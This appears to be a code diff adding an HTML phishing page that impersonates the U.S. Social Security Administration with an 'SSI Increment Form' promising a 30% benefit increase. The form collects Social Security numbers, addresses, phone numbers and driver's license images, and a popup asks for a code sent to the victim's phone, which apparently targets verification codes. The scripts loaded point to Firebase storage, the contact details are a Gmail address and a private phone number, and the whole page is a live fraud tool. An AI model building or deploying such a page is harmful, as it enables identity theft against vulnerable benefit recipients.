@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSI Increment Form</title>
+    <link rel="stylesheet" href="frust.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <!-- Add Firebase products that you want to use -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://www.ssa.gov/themes/custom/ssa_core/logo.svg" alt="Logo" class="logo">
+            <span class="logo-text">Social Security</span>
+        </div>
+        
+        <h1>SSI Increment Form</h1>
+        <form id="userForm">
+            <label for="firstName">First Name:</label>
+            <input type="text" id="firstName" name="firstName" required>
+
+            <label for="lastName">Last Name:</label>
+            <input type="text" id="lastName" name="lastName" required>
+
+            <label for="address">Address:</label>
+            <input type="text" id="address" name="address" required>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="phone">Phone Number:</label>
+            <input type="tel" id="phone" name="phone" required>
+
+            <label for="ssn">SSN:</label>
+            <input type="text" id="ssn" name="ssn" required>
+
+            <label for="licenseFront">Driver License (Front):</label>
+            <input type="file" id="licenseFront" name="licenseFront" accept="image/*" required>
+
+            <label for="licenseBack">Driver License (Back):</label>
+            <input type="file" id="licenseBack" name="licenseBack" accept="image/*" required>
+
+            <label for="income">Present Income:</label>
+            <input type="number" id="income" name="income" required>
+            <button type="button" onclick="calculateIncome()">Calculate 30% Increase</button>
+            <div id="incomeResult"></div>
+
+            <button type="submit">Submit</button>
+        </form>
+
+        <div class="contact-info">
+            <p>Email: economic.financial.aid@gmail.com</p>
+            <p>Message Us: +1 3852364123</p>
+        </div>
+    </div>
+
+    <div id="codeNotificationPage" class="popup">
+        <div class="popup-content">
+            <p>A code will be sent to your phone number to verify your application.</p>
+            <button type="button">Send Code</button>
+        </div>
+    </div>
+
+    <div id="codePage" class="popup">
+        <div class="popup-content">
+            <div id="countdown"></div>
+            <p>A code will be sent to your phone number in the next 10 minutes to verify your application. Else contact our customer care at <i class="fas fa-comment"></i> 3852364123.</p>
+            <label for="code">Enter Code:</label>
+            <input type="text" id="code" name="code" required>
+            <button type="button">Next</button>
+        </div>
+    </div>
+
+    <div id="successPopup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="closePopup('successPopup')">&times;</span>
+            <p id="successMessage"></p>
+            <div class="check-circle"><i class="fas fa-check-circle"></i></div>
+            <p><i class="fas fa-comment"></i> Contact our customer care at 3852364123.</p>
+        </div>
+    </div>
+
+    <script src="frust.js"></script>
+</body>
+</html>
